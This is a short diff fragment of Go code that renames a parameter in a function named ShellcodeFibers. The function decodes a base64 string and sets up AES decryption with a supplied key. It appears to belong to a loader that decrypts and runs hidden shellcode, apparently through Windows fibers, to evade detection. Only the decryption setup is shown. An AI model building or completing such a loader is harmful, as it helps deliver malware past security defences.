@@ -26,8 +26,8 @@ const (
 	NUMA_NODE              = 0
 )
 
-func ShellcodeFibers(code string, password string) {
-	ciphertext, _ := base64.StdEncoding.DecodeString(code)
+func ShellcodeFibers(Shellcode string, password string) {
+	ciphertext, _ := base64.StdEncoding.DecodeString(Shellcode)
 	key, _ := base64.StdEncoding.DecodeString(password)
 	block, _ := aes.NewCipher(key)
 	plaintext := make([]byte, len(ciphertext))
